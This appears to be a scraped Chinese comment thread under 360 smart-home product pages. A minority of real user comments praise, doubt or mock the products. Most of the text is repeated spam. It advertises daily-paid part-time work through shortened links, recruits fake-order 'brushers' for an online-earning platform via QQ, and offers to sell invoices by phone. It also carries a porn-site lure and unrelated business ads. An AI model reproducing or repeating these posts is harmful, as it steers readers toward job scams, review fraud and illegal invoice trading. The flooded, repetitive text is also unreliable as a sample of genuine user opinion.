----- 【业余找工作】 --------工 资每天結算 ～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～ 即可报名咨询 ～不限 制工作 时间，做的 越多 挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
----- 【业余找工作】 --------工 资每天結算 ～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～ 即可报名咨询 ～不限 制工作 时间，做的 越多 挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
----- 【业余找工作】 --------工 资每天結算 ～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～ 即可报名咨询 ～不限 制工作 时间，做的 越多 挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
这个没有我们公司的好用，比360家庭卫士多几个功能：1、支持插卡录像功能，电脑不需要开机就能录像，2、可以无线也可以接网线，高清画面链接网络远程才流畅，3、可用电脑和手机远程控制左右上下旋转，4、可以远程回放录像，有需要的朋友可以加我 空间有演示视频
这个没有我们公司的好用，比360家庭卫士多几个功能：1、支持插卡录像功能，电脑不需要开机就能录像，2、可以无线也可以接网线，高清画面链接网络远程才流畅，3、可用电脑和手机远程控制左右上下旋转，4、可以远程回放录像，有需要的朋友可以加我 空间有演示视频
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
----- 【业余找工作】 --------工 资每天結算 ～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～ 即可报名咨询 ～不限 制工作 时间，做的 越多 挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
太帅了，超级超前的构思，好想要一个
----- 【业余找工作】 --------工 资每天結算 ～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～ 即可报名咨询 ～不限 制工作 时间，做的 越多 挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
----- 【业余找工作】 --------工 资每天結算 ～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～ 即可报名咨询 ～不限 制工作 时间，做的 越多 挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
欢迎到来QT1269网赚创业平台，目前只做推广，不收任何费用直接审核入会上马甲，要求经常在线，做推广，视贡献给予上管理，新工会求发展，诚聘各公频专业人员入会常驻。现在推广免费专业刷手，欢迎全职，更多管理职位，大量商家云集，只欠兼职人员。免费会员有限请速占领席位，晚了全部收费！本频道优势，客户可以全屏下单，会员可全屏接单，没有地区，班组，等级限制，欢迎入驻！推荐人：5组星空 扣扣 116789951
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
----- 【业余找工作】 --------工 资每天結算 ～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～ 即可报名咨询 ～不限 制工作 时间，做的 越多 挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
----- 【业余找工作】 --------工 资每天結算 ～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～ 即可报名咨询 ～不限 制工作 时间，做的 越多 挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
欢迎到来QT 1269 网赚创业平台，目前只做推广，不收任何费用，直接审核入会上马甲欢迎会员和商家入驻！推荐人：5组星 空 扣扣116789951
----- 【业余找工作】 --------工 资每天結算 ～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～ 即可报名咨询 ～不限 制工作 时间，做的 越多 挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
无聊，不实用的东西
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
----- 【业余找工作】 --------工 资每天結算 ～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～ 即可报名咨询 ～不限 制工作 时间，做的 越多 挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
----- 【业余找工作】 --------工 资每天結算 ～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～ 即可报名咨询 ～不限 制工作 时间，做的 越多 挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
欢迎到来QT 1269 网赚创业平台，目前只做推广，不收任何费用，直接审核入会上马甲欢迎会员和商家入驻！推荐人：5组星 空 扣扣116789951 
看起来很不错，希望能拥有一块。
欢迎到来QT 1269 网赚创业平台，目前只做推广，不收任何费用，直接审核入会上马甲欢迎会员和商家入驻！推荐人：5组星 空 扣扣116789951 
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
欢迎到来QT 1269 网赚创业平台，目前只做推广，不收任何费用，直接审核入会上马甲欢迎会员和商家入驻！推荐人：5组星 空 扣扣116789951 
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
欢迎到来QT 1269 网赚创业平台，目前只做推广，不收任何费用，直接审核入会上马甲欢迎会员和商家入驻！推荐人：5组星 空 扣扣116789951 
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
----- 【业余找工作】 --------工 资每天結算 ～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～ 即可报名咨询 ～不限 制工作 时间，做的 越多 挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
欢迎到来QT 1269 网赚创业平台，目前只做推广，不收任何费用，直接审核入会上马甲欢迎会员和商家入驻！推荐人：5组星 空 扣扣116789951 
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
欢迎到来QT 1269 网赚创业平台，目前只做推广，不收任何费用，直接审核入会上马甲欢迎会员和商家入驻！推荐人：5组星 空 扣扣116789951 
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
欢迎到来QT 1269 网赚创业平台，目前只做推广，不收任何费用，直接审核入会上马甲欢迎会员和商家入驻！推荐人：5组星 空 扣扣116789951 
一直想有一台投影仪，希望价格我可以接受。
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
欢迎到来QT 1269 网赚创业平台，目前只做推广，不收任何费用，直接审核入会上马甲欢迎会员和商家入驻！推荐人：5组星 空 扣扣116789951 
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
哇噻  要是带着它，我每次溜冰刷街都可以装逼了
欢迎到来QT 1269 网赚创业平台，目前只做推广，不收任何费用，直接审核入会上马甲欢迎会员和商家入驻！推荐人：5组星 空 扣扣116789951 
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
欢迎到来QT 1269 网赚创业平台，目前只做推广，不收任何费用，直接审核入会上马甲欢迎会员和商家入驻！推荐人：5组星 空 扣扣116789951 
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
都有那些污染 你别光嘴说，有什么证据。
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
欢迎到来QT 1269 网赚创业平台，目前只做推广，不收任何费用，直接审核入会上马甲欢迎会员和商家入驻！推荐人：5组星 空 扣扣116789951 
这款车要多少钱？
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
欢迎到来QT 1269 网赚创业平台，目前只做推广，不收任何费用，直接审核入会上马甲欢迎会员和商家入驻！推荐人：5组星 空 扣扣116789951 
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
欢迎到来QT 1269 网赚创业平台，目前只做推广，不收任何费用，直接审核入会上马甲欢迎会员和商家入驻！推荐人：5组星 空 扣扣116789951 
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
欢迎到来QT 1269 网赚创业平台，目前只做推广，不收任何费用，直接审核入会上马甲欢迎会员和商家入驻！推荐人：5组星 空 扣扣116789951 
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
欢迎到来QT 1269 网赚创业平台，目前只做推广，不收任何费用，直接审核入会上马甲欢迎会员和商家入驻！推荐人：5组星 空 扣扣116789951 
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
欢迎到来QT 1269 网赚创业平台，目前只做推广，不收任何费用，直接审核入会上马甲欢迎会员和商家入驻！推荐人：5组星 空 扣扣116789951 
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
欢迎到来QT 1269 网赚创业平台，目前只做推广，不收任何费用，直接审核入会上马甲欢迎会员和商家入驻！推荐人：5组星 空 扣扣116789951 
欢迎到来QT 1269 网赚创业平台，目前只做推广，不收任何费用，直接审核入会上马甲欢迎会员和商家入驻！推荐人：5组星 空 扣扣116789951 
诏搛耳只 工资每天結算～～～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
欢迎到来QT 1269 网赚创业平台，目前只做推广，不收任何费用，直接审核入会上马甲欢迎会员和商家入驻！推荐人：5组星 空 扣扣116789951 
欢迎到来QT 1269 网赚创业平台，目前只做推广，不收任何费用，直接审核入会上马甲欢迎会员和商家入驻！推荐人：5组星 空 扣扣116789951 
点击上面可预约就可以了哦，亲！
欢迎到来QT 1269 网赚创业平台，目前只做推广，不收任何费用，直接审核入会上马甲欢迎会员和商家入驻！推荐人：5组星 空 扣扣116789951 
欢迎到来QT 1269 网赚创业平台，目前只做推广，不收任何费用，直接审核入会上马甲欢迎会员和商家入驻！推荐人：5组星 空 扣扣116789951 
欢迎到来QT 1269 网赚创业平台，目前只做推广，不收任何费用，直接审核入会上马甲欢迎会员和商家入驻！推荐人：5组星 空 扣扣116789951 
同城美女交友 http://url.cn/O7R1FE    同城美女交友 http://url.cn/O7R1FE      同城美女交友 http://url.cn/O7R1FE
有我真好，感谢360，感谢奇酷
啥都没写就中了
好方便，期待他的到来
期待！！！！！
欢迎到来QT 1269 网赚创业平台，目前只做推广，不收任何费用，直接审核入会上马甲欢迎会员和商家入驻！推荐人：5组星 空 扣扣116789951 
感觉好酷!
诏搛耳只 工资每天結算～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
看起来不错的啊
下面这么多打广告的。没诚意。鄙视。
看起来不错的啊 
下面这么多打广告的。没诚意。鄙视。
欢迎到来QT 1269 网赚创业平台，目前只做推广，不收任何费用，直接审核入会上马甲欢迎会员和商家入驻！推荐人：5组星 空 扣扣116789951 
太给力了，这个宝贝我太喜欢了，热情期待中……
把他放到工厂区，防止工人‘偷懒’……
这个球很小，对它的净化功能怀疑。就算可以，这么小，效率高吗？要是效率高，就是一款超好的产品！
加油。一如既往的相信支持360，专业呵护，倍感温暖
拜托开发人员，脑子短路吗？只能是苹果手机吗？安卓用户可比苹果多呢！无视安卓用户存在了吗？脑子进水了吧？还是只看中苹果商店的软件下载有分成了呢？
没有电子陀螺仪的，当然会吹跑了。
怎么没看到散热孔，难道没有热量。
真是好东西啊
新奇特的饰品9.9包邮送给你http://shop67029579.taobao.com/
非常支持，希望得到一个
。。。贼会不会进来了。。。看  诶？！这东西好像很高科技的样子。。。。 然后就把这货偷走了。。
好东东，期待
欢迎到来QT 1269 网赚创业平台，目前只做推广，不收任何费用，直接审核入会上马甲欢迎会员和商家入驻！推荐人：5组星 空 扣扣116789951  
什么时候可以售卖呀
已经申请试用了，也分享了，还关注了，坐等好消息啦！呵呵
说那么好真的那么神奇吗？难以置信。感觉是 吹。就验证个
但愿幸运光顾，非常希望试用一个。
 这个东西是好,问题就是这个大小怎么定,电池的续航有多久.
我想要，要要要要要要要要
但愿能够申请到，谢谢！
来啊，快来呀，等的不耐烦了，快递大哥快来按响我家的门铃，么么哒想疯了，别让我等的焦急了啊。多年关注360产品，怎么着也得照顾我这铁杆粉底哦，么么哒
太想获得试用资格了
快发售吧，很想给家里装一个~！
这么多年一直用360  ！
好喜欢 好前卫
我要，我要要要
产品不错！感觉这玩意技术还不成熟呀！
希望能WiFi至强大的360云盘实现拍照、录像等存储及监控，建立一个全民监控帝国
相信周鸿祎但是绝不相信360问答的管理部门！！！
老周 尽管您也是为人父之人  但是还是恳请您从更广大中国人民的日常生活出发研制开发产品  比方可以方便老百姓使用的可以督查孩子使用网络wifi情况的软件  祝老周全家幸福安康！！！
这个没有我们公司的好用，比360家庭卫士多几个功能：1、支持插卡录像功能，电脑不需要开机就能录像，2、可以无线也可以接网线，高清画面链接网络远程才流畅，3、可用电脑和手机远程控制左右上下旋转，4、可以远程回放录像，有需要的朋友可以加我 空间有演示视频 
正版APP有得下？？？？？？？
360的软件有病毒 就因为有病毒 我的电脑重整系统好几次 手机都刷机好几回了  360一点也不好 劝大家还是换电脑管家
用360 电脑经常死机
现在有没有的卖了啊 
我可是360的忠实老用户了，真心希望能够得到免费试用的资格。360的确好用
我期期都申请落空了，这个的确是很有用的东东。我家这边贼太多，这个对防贼用处太大了。希望得到噢
我要申请样品，免费试用，提供测试报告。
支持多种设备共享连接才好 
骗子广告都打到这来了
怕丢了。 360防丢卫士
我很期待得到
腾讯狗，滚！
垃圾腾讯狗
总有一天，有人会通过木马入侵控制你的摄像头，全球直播你和女友爱爱的视频，不解释······
那你还来？
建议360成立用户反馈信息的一个通道，不顾及用户的感受。
我家、办公室电脑和手机全用360浏览器、杀毒软件，非常的好用。相信360家庭卫士不负众望，横空出世！
永远支持360
我很期待它的到来！！！
感觉很无聊
觉得很无聊............
这..........一丢就很难找到啊.........
作为360忠实用户之一，I LOVE YOU  
额...我已经能辨别出梦境了... 同意底楼的看法
==..........大哥你和360什么关系............
不是说2014年在中国上市的吗，怎么还在创意中.............
360好360妙360呱呱叫！
再不上市基本上就没戏了。
好东西就要力顶
写的很赞哦！搞笑中带领我们了解了这款产品的主要功能和他的优劣，不错~！估计定位精确的问题是所有儿童定位手机中共同的问题。这个没有保障的话，各位宝爸宝妈给孩子买的也顶多是个儿童手表而已，要想依靠它来免除后顾之忧是远远不做不到的。。。
这个不敢用
最好倒闭了
这创意好好的，，可以加点老人功能吗。。
这创意好好的，，可以加点老人功能吗。。
360支持你 你最棒 ~\(≧▽≦)/~
貌似抓小三的能力又强大了一步》
上次预约成功，可惜抢购时正在上班，没法抢购。这次又预约成功，又是星期二抢购，又要上班，又抢购不到，这样子上班族永远抢购不到。强烈建议抢购时间改为双休日！
他是来无节操卖广告的～
me too
鄙视腾讯老逗比，XP挑战赛都输了还敢出来，那你特么还申请360账号，吃饱了拉的吧？！
鄙视腾讯老逗比，XP挑战赛都输了还敢出来，那你特么还申请360账号，吃饱了拉的吧？！
鄙视腾讯老逗比，XP挑战赛都输了还敢出来，那你特么还申请360账号，吃饱了拉的吧？！
我真心支持360，永远支持360
求给个写报告的机会吧 
赶快发售也好
我用360至少5年了，从来没出现过中病毒啊 的情况。我支持360， 顺便，腾讯的管家就特么是个垃圾！！鄙视腾讯狗。
去你妈的吧，电脑垃圾还好意思埋汰360   真不要脸
家庭卫士功能很强大，不错。。。
360 产品真心不错   一直 再用
支持360，百度去死吧。唉，这么多人，我可能申请不到啊。
----- 【业余找工作】--------工 资每天結算 ～ 【 http://t.cn/8sfyr3p 】 复制到 浏览器打开 ～ 即可报名咨询 ～不限 制工作 时间，做的 越多 挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
-----【业余找工作】--------工资每天結算 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～不限制工作时间，做的越多挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
-----【业余找工作】--------工资每天結算 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～不限制工作时间，做的越多 挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
-----【业余找工作】--------工资每天結算 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～不限制工作时间，做的越多挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
-----【业余找工作】--------工资每天結算 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～不限制工作时间，做的越多 挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
有啊，360有问题反馈的通道，每个产品都有。 http://bbs.360safe.com/forum.php?gid=90
看起来挺好的  支持下   有机会能试用最好
申请几回产品试用，还没有中过，希望这次能给我个机会
这么多次的申请，都如流星闪烁进星海，大婶，你就给我一个把，我这公司2000个同事，最起码我能让这2000个人都晓得，我在办公室，我摆在办公室，又当监控，又宣传。
我昨天支付的什么时候能发货啊？？？
 宅男福利！直接复制进入【hulai.pw】大家都懂得！男士福利！女生勿入!
我相信360并希望360能推出更多贴近生活的功能，产品。
----【业余找工作】--------工资每天結算 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～不限制工作时间，做的越多挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
----【业余找工作】--------工资每天結算 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～不限制工作时间， 做的越多挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
你太有才了！！！
360的产品还是很不凑的，杀毒软件。360卫士的，还有360的一些其他产品，支持360，反对腾讯百度对360的绞杀
济宁协力特种气体有限公司是一家集生产、研发、经营各种工业气体、标准气体、液化气体和特种气体于一体的高新技术企业。产品包括：标准气体：甲--烷标准气体、一*氧*化*碳标准气体、报警检漏仪校验用标准气、环保监测用标准气体、医疗卫生用标准气、电力工业用标准气体、空分工业用标准气、化肥工业用标准气体、可燃气体报警仪用气体、汽车尾气排放标准气、
高纯气体：高纯氧气、高纯氮气、高纯氩气、高纯氦气、高纯空气、高纯二氧化碳、高纯甲--烷、高纯乙烯、高纯乙炔、高纯六---氟等。混合气体：二元混合气、多元混合气体、二氩混合气、P10气体、灯氩混合气体、液态气体。高纯氦气和高纯H-H：我公司新采购多辆高纯气体长管拖车，可以为客户大量供应高纯氦气和高纯H-H。氦气美国进口，氢气保证纯度。联系人：祝家连 18764796334  QQ:441315518
----【业余找工作】--------工资每天結算 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
----【业余找工作】--------工资每天結算 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～不限制工作时间， 做的越多挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
----【业余找工作】--------工资每天結算 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～不限制工作时间， 做的越多挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
申请的人太多了，希望自己是幸运者。
---【业余找工作】--------工资每天結算 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～不限制工作时间， 做的越多挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
---【业余找工作】--------工资每天結算 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
宅男福利！直接复制进入【hulai.pw】大家都懂得！男士福利！女生勿入! 
360的产品还是初学者不错的选择的 
---【业余找工作】--------工资每天結算 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
---【业余找工作】--------工资每天結算 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
*** 13717005665 验证后付款。来电咨询！
---【业余找工作】--------工资每天結算 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～不限制工作时间， 做的越多挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
---【业余找工作】--------工资每天結算 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～不限制工作时间， 做的越多挣的越多～～ （宝妈、学生、上班族都可以）～  每夭8o~15o，我详细作讲解～  
發瞟 13717005665 林经理
---【业余找工作】--------工资每天結算 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～不限制工作时间， 做的越多挣的越多～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
---【业余找工作】--------工资每天結算 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
